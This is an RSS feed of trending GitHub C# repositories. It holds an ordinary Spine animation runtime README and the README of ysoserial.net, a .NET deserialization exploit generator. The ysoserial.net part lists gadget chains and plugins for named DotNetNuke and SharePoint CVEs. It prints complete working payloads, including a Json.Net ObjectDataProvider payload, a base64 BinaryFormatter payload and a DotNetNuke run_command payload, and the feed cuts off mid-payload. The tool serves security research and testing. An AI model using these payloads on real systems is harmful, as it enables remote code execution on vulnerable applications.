<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-07-22T01:36:41Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>EsotericSoftware/spine-runtimes</title>
    <updated>2022-07-22T01:36:41Z</updated>
    <id>tag:github.com,2022-07-22:/EsotericSoftware/spine-runtimes</id>
    <link href="https://github.com/EsotericSoftware/spine-runtimes" rel="alternate"></link>
    <summary type="html">&lt;p&gt;2D skeletal animation runtimes for Spine.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Spine Runtimes&lt;/h1&gt; &#xA;&lt;p&gt;This GitHub project hosts the Spine Runtimes which are needed to use &lt;a href=&#34;http://esotericsoftware.com/&#34;&gt;Spine&lt;/a&gt; 2D skeletal animation data with various game toolkits.&lt;/p&gt; &#xA;&lt;h2&gt;Licensing&lt;/h2&gt; &#xA;&lt;p&gt;You are welcome to evaluate the Spine Runtimes and the examples we provide in this repository free of charge.&lt;/p&gt; &#xA;&lt;p&gt;You can integrate the Spine Runtimes into your software free of charge, but users of your software must have their own &lt;a href=&#34;https://esotericsoftware.com/spine-purchase&#34;&gt;Spine license&lt;/a&gt;. Please make your users aware of this requirement! This option is often chosen by those making development tools, such as an SDK, game toolkit, or software library.&lt;/p&gt; &#xA;&lt;p&gt;In order to distribute your software containing the Spine Runtimes to others that don&#39;t have a Spine license, you need a &lt;a href=&#34;https://esotericsoftware.com/spine-purchase&#34;&gt;Spine license&lt;/a&gt; at the time of integration. Then you can distribute your software containing the Spine Runtimes however you like, provided others don&#39;t modify it or use it to create new software. If others want to do that, they&#39;ll need their own Spine license.&lt;/p&gt; &#xA;&lt;p&gt;For the official legal terms governing the Spine Runtimes, please read the &lt;a href=&#34;http://esotericsoftware.com/spine-runtimes-license&#34;&gt;Spine Runtimes License Agreement&lt;/a&gt; and Section 2 of the &lt;a href=&#34;http://esotericsoftware.com/spine-editor-license#s2&#34;&gt;Spine Editor License Agreement&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;http://esotericsoftware.com/spine-runtimes-guide&#34;&gt;Spine Runtimes Guide&lt;/a&gt; for detailed information about using the Spine Runtimes. The Spine &lt;a href=&#34;http://esotericsoftware.com/spine-documentation#runtimesTitle&#34;&gt;documentation page&lt;/a&gt; provides further information about tools and data formats. For runtime specific documentation, refer to the &lt;code&gt;README.md&lt;/code&gt; file in each runtime directory.&lt;/p&gt; &#xA;&lt;h2&gt;Bugs, enhancements, and tasks&lt;/h2&gt; &#xA;&lt;p&gt;Review our backlog of bugs, enhancements, and tasks in the &lt;a href=&#34;https://github.com/EsotericSoftware/spine-runtimes/issues&#34;&gt;spine-runtimes&lt;/a&gt; and &lt;a href=&#34;https://github.com/EsotericSoftware/spine-editor/issues&#34;&gt;spine-editor&lt;/a&gt; issue trackers. Our &lt;a href=&#34;http://esotericsoftware.com/spine-roadmap&#34;&gt;roadmap&lt;/a&gt; provides a more convenient view of the same issue tracker information.&lt;/p&gt; &#xA;&lt;h2&gt;Versioning&lt;/h2&gt; &#xA;&lt;p&gt;The default branch on GitHub is stable and works with data exported from the latest, non-beta version of the Spine editor. New development is done in an &lt;code&gt;X.X-beta&lt;/code&gt; branch, which may be a work in progress. Important changes to the runtimes can be reviewed in the &lt;a href=&#34;https://raw.githubusercontent.com/EsotericSoftware/spine-runtimes/4.1/CHANGELOG.md&#34;&gt;CHANGELOG.md file&lt;/a&gt;. Occasionally the Spine Runtimes are &lt;a href=&#34;https://github.com/EsotericSoftware/spine-runtimes/releases&#34;&gt;tagged&lt;/a&gt; with the specific Spine editor version they work with.&lt;/p&gt; &#xA;&lt;p&gt;It is highly suggested to &lt;a href=&#34;http://esotericsoftware.com/spine-settings#Version&#34;&gt;freeze&lt;/a&gt; the Spine editor version to match the Spine Runtimes source being used and to update them in lock step. See the &lt;a href=&#34;http://esotericsoftware.com/spine-runtime-architecture#Versioning&#34;&gt;Spine Runtimes Guide&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;In order to merge your contributions, we need a signed &lt;a href=&#34;http://esotericsoftware.com/licenses/cla.txt&#34;&gt;contributor license agreement (CLA)&lt;/a&gt; from you. You can send a copy of the CLA to &lt;a href=&#34;mailto:contact@esotericsoftware.com&#34;&gt;contact@esotericsoftware.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When possible, it is best to base your contributions on the current beta branch (&lt;code&gt;X.X-beta&lt;/code&gt;). Please be sure to follow the style and formatting you find in the respective runtime code to which you are contributing.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>pwntester/ysoserial.net</title>
    <updated>2022-07-22T01:36:41Z</updated>
    <id>tag:github.com,2022-07-22:/pwntester/ysoserial.net</id>
    <link href="https://github.com/pwntester/ysoserial.net" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Deserialization payload generator for a variety of .NET formatters&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;&lt;img src=&#34;https://raw.githubusercontent.com/pwntester/ysoserial.net/master/logo.png&#34; alt=&#34;logo&#34;&gt;&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/pwntester/ysoserial.net/workflows/GitHub%20CI/badge.svg?branch=master&#34; alt=&#34;GitHub CI&#34;&gt; &lt;a href=&#34;https://dev.azure.com/alvaro0002/ysoserial.net/_build/latest?definitionId=1&amp;amp;branchName=v2&#34;&gt;&lt;img src=&#34;https://img.shields.io/azure-devops/build/alvaro0002/ysoserial.net/1/v2.svg?label=v2%20branch&#34; alt=&#34;v2&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/pwntester/ysoserial.net/releases/latest&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/download-latest-blue.svg?sanitize=true&#34; alt=&#34;download&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/pwntester/ysoserial.net/master/LICENSE.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/pwntester/ysoserial.net.svg?sanitize=true&#34; alt=&#34;license&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/stars/pwntester/ysoserial.net.svg?style=social&#34; alt=&#34;stars&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/forks/pwntester/ysoserial.net.svg?style=social&#34; alt=&#34;forks&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.&lt;/p&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;ysoserial.net is a collection of utilities and property-oriented programming &#34;gadget chains&#34; discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.&lt;/p&gt; &#xA;&lt;p&gt;It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.&lt;/p&gt; &#xA;&lt;p&gt;This project is inspired by &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;Chris Frohoff&#39;s ysoserial project&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.&lt;/p&gt; &#xA;&lt;p&gt;This software is a personal project and not related with any companies, including Project owner and contributors employers.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;You can install the latest version and previous releases of YSoSerial.NET from &lt;a href=&#34;https://github.com/pwntester/ysoserial.net/releases&#34;&gt;the releases page&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Release 1.34 (latest version): &lt;a href=&#34;https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip&#34;&gt;Download&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial -h&#xA;ysoserial.net generates deserialization payloads for a variety of .NET formatters.&#xA;&#xA;== GADGETS ==&#xA;&#x9;(*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored]&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class] (supports extra options: use the &#39;--fullhelp&#39; argument to view)&#xA;&#x9;&#x9;Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter&#xA;&#x9;(*) ActivitySurrogateSelectorFromFile [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;] (supports extra options: use the &#39;--fullhelp&#39; argument to view)&#xA;&#x9;&#x9;Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter&#xA;&#x9;(*) AxHostState&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) ClaimsIdentity&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;&#x9;(*) ClaimsPrincipal&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;&#x9;(*) DataSet&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;&#x9;(*) DataSetTypeSpoof&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;&#x9;(*) ObjectDataProvider (supports extra options: use the &#39;--fullhelp&#39; argument to view)&#xA;&#x9;&#x9;Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet &amp;lt; 5.0.0&#xA;&#x9;(*) PSObject [Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)]&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) RolePrincipal&#xA;&#x9;&#x9;Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) SessionSecurityToken&#xA;&#x9;&#x9;Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) SessionViewStateHistoryItem&#xA;&#x9;&#x9;Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) TextFormattingRunProperties [This normally generates the shortest payload] (supports extra options: use the &#39;--fullhelp&#39; argument to view)&#xA;&#x9;&#x9;Formatters: BinaryFormatter , DataContractSerializer , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) ToolboxItemContainer&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;&#x9;(*) TypeConfuseDelegate&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer&#xA;&#x9;(*) TypeConfuseDelegateMono [Tweaked TypeConfuseDelegate gadget to work with Mono]&#xA;&#x9;&#x9;Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer&#xA;&#x9;(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)] (supports extra options: use the &#39;--fullhelp&#39; argument to view)&#xA;&#x9;&#x9;Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)&#xA;&#x9;(*) WindowsIdentity&#xA;&#x9;&#x9;Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#x9;(*) WindowsPrincipal&#xA;&#x9;&#x9;Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;&#xA;== PLUGINS ==&#xA;&#x9;(*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)&#xA;&#x9;(*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)&#xA;&#x9;(*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)&#xA;&#x9;(*) Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)&#xA;&#x9;(*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)&#xA;&#x9;(*) Resx (Generates RESX and .RESOURCES files)&#xA;&#x9;(*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)&#xA;&#x9;(*) SharePoint (Generates poayloads for the following SharePoint CVEs: CVE-2020-1147, CVE-2019-0604, CVE-2018-8421)&#xA;&#x9;(*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)&#xA;&#x9;(*) ViewState (Generates a ViewState using known MachineKey parameters)&#xA;&#xA;Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysoserial.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.&#xA;&#xA;Usage: ysoserial.exe [options]&#xA;Options:&#xA;  -p, --plugin=VALUE         The plugin to be used.&#xA;  -o, --output=VALUE         The output format (raw|base64). Default: raw&#xA;  -g, --gadget=VALUE         The gadget chain.&#xA;  -f, --formatter=VALUE      The formatter.&#xA;  -c, --command=VALUE        The command to be executed.&#xA;      --rawcmd               Command will be executed as is without `cmd /c ` &#xA;                               being appended (anything after first space is an &#xA;                               argument).&#xA;  -s, --stdin                The command to be executed will be read from &#xA;                               standard input.&#xA;  -t, --test                 Whether to run payload locally. Default: false&#xA;      --minify               Whether to minify the payloads where applicable. &#xA;                               Default: false&#xA;      --ust, --usesimpletype This is to remove additional info only when &#xA;                               minifying and FormatterAssemblyStyle=Simple &#xA;                               (always `true` with `--minify` for binary &#xA;                               formatters). Default: true&#xA;      --raf, --runallformatters&#xA;                             Whether to run all the gadgets with the provided &#xA;                               formatter (ignores gagdet name, output format, &#xA;                               and the test flag). This will search in &#xA;                               formatters and also show the displayed payload &#xA;                               length. Default: false&#xA;      --sf, --searchformatter=VALUE&#xA;                             Search in all formatters to show relevant &#xA;                               gadgets and their formatters (other parameters &#xA;                               will be ignored).&#xA;      --debugmode            Enable debugging to show exception errors and &#xA;                               output length&#xA;  -h, --help                 Shows this message and exit.&#xA;      --fullhelp             Shows this message + extra options for gadgets &#xA;                               and plugins and exit.&#xA;      --credit               Shows the credit/history of gadgets and plugins &#xA;                               (other parameters will be ignored).&#xA;      --runmytest            Runs that `Start` method of `TestingArenaHome` - &#xA;                               useful for testing and debugging.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; When specifying complex commands, it can be tedious to escape some special character (;, |, &amp;amp;, ..). Use stdin option (-s) to read the command from stdin:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the &#34;type&#34; attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.&lt;/p&gt; &#xA;&lt;h2&gt;Plugins&lt;/h2&gt; &#xA;&lt;p&gt;Ysoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use &lt;code&gt;-p &amp;lt;plugin name&amp;gt;&lt;/code&gt; followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more help on plugin options use &lt;code&gt;-h&lt;/code&gt; along with &lt;code&gt;-p &amp;lt;plugin name&amp;gt;&lt;/code&gt;. Eg:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -h -p DotNetNuke&#xA;ysoserial.net generates deserialization payloads for a variety of .NET formatters.&#xA;&#xA;Plugin:&#xA;&#xA;DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)&#xA;&#xA;Options:&#xA;&#xA;  -m, --mode=VALUE           the payload mode: read_file, write_file, run_command.&#xA;  -c, --command=VALUE        the command to be executed in run_command mode.&#xA;  -u, --url=VALUE            the url to fetch the file from in write_file mode.&#xA;  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.&#xA;      --minify               Whether to minify the payloads where applicable (experimental). Default: false&#xA;      --ust, --usesimpletype This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;h3&gt;Generate a &lt;strong&gt;calc.exe&lt;/strong&gt; payload for Json.Net using &lt;em&gt;ObjectDataProvider&lt;/em&gt; gadget.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c &#34;calc&#34; -t&#xA;{&#xA;    &#39;$type&#39;:&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;,&#xA;    &#39;MethodName&#39;:&#39;Start&#39;,&#xA;    &#39;MethodParameters&#39;:{&#xA;        &#39;$type&#39;:&#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;,&#xA;        &#39;$values&#39;:[&#39;cmd&#39;,&#39;/ccalc&#39;]&#xA;    },&#xA;    &#39;ObjectInstance&#39;:{&#39;$type&#39;:&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a &lt;strong&gt;calc.exe&lt;/strong&gt; payload for BinaryFormatter using &lt;em&gt;PSObject&lt;/em&gt; gadget.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c &#34;calc&#34; -t&#xA;AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a run_command payload for DotNetNuke using its plugin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -p DotNetNuke -M run_command -C calc.exe&#xA;&amp;lt;profile&amp;gt;&amp;lt;item key=&#34;foo&#34; type=&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;&amp;gt;&amp;lt;ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=&#34; [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) &#34; xmlns:xsi=&#34; [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) &#34;&amp;gt;&amp;lt;ExpandedElement/&amp;gt;&amp;lt;ProjectedProperty0&amp;gt;&amp;lt;MethodName&amp;gt;Deserialize&amp;lt;/MethodName&amp;gt;&amp;lt;MethodParameters&amp;gt;&amp;lt;anyType xsi:type=&#34;xsd:string&#34;&amp;gt;/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2Vya